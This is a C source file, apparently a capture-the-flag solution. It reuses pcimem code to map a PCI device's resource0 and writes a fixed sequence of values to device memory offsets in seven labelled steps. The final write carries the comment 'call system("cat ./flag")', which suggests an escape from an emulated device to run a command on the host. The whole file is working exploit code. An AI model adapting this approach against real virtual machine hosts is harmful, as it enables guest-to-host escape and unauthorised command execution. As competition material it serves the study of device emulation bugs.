/*
  Most of this code is taken from pcimem tool

  https://github.com/billfarrow/pcimem
*/

#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <termios.h>
#include <unistd.h>

#define PRINT_ERROR                                                            \
  do {                                                                         \
    fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", __LINE__,         \
            __FILE__, errno, strerror(errno));                                 \
    exit(1);                                                                   \
  } while (0)

#define MAP_SIZE 4096UL
#define MAP_MASK (MAP_SIZE - 1)

int fd = -1;

char *filename = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
void pcimem(uint64_t target, char access_type, uint64_t writeval) {
  /* Map one page */
  printf("mmap(%d, %ld, 0x%x, 0x%x, %d, 0x%x)\n", 0, MAP_SIZE,
         PROT_READ | PROT_WRITE, MAP_SHARED, fd, (int)target);
  void *map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                        target & ~MAP_MASK);
  if (map_base == (void *)-1)
    PRINT_ERROR;
  printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long)map_base);
  uint64_t read_result;

  int type_width = 0;
  void *virt_addr = map_base + (target & MAP_MASK);
  switch (access_type) {
  case 'b':
    *((uint8_t *)virt_addr) = writeval;
    read_result = *((uint8_t *)virt_addr);
    type_width = 1;
    break;
  case 'h':
    *((uint16_t *)virt_addr) = writeval;
    read_result = *((uint16_t *)virt_addr);
    type_width = 2;
    break;
  case 'w':
    *((uint32_t *)virt_addr) = writeval;
    read_result = *((uint32_t *)virt_addr);
    type_width = 4;
    break;
  case 'd':
    *((uint64_t *)virt_addr) = writeval;
    read_result = *((uint64_t *)virt_addr);
    type_width = 8;
    break;
  }
  printf("Written 0x%0*lX; readback 0x%*lX\n", type_width, writeval, type_width,
         read_result);
  if (munmap(map_base, MAP_SIZE) == -1)
    PRINT_ERROR;
}

int main(int argc, char **argv) {
  off_t target;

  target = strtoul(argv[2], 0, 0);

  if ((fd = open(filename, O_RDWR | O_SYNC)) == -1)
    PRINT_ERROR;
  printf("%s opened.\n", filename);
  printf("Target offset is 0x%x, page size is %ld\n", (int)target,
         sysconf(_SC_PAGE_SIZE));

  pcimem(0x060000, 'b', 0xd); // Step 1

  pcimem(0x000000, 'b', 0xd); // Step 2
  pcimem(0x010000, 'b', 0xd); // Step 2

  pcimem(0x100000, 'b', 0xd);       // Step 3
  pcimem(0x200000, 'd', 0x131796d); // Step 4

  int i = 0;
  for (i; i < 6; i++) {
    pcimem(i << 16, 'b', 0xd); // Step 5
  }

  for (i = 0; i < 6; i++) {
    pcimem((0x20 | i) << 16, 'd', 0x1130b78000000); // Step 6
  }

  pcimem(0x280000, 'd', 0x6E65F9); // Step 7
  pcimem(0x000000, 'b', 0x10);     // call system("cat ./flag")

  close(fd);
  return 0;
}
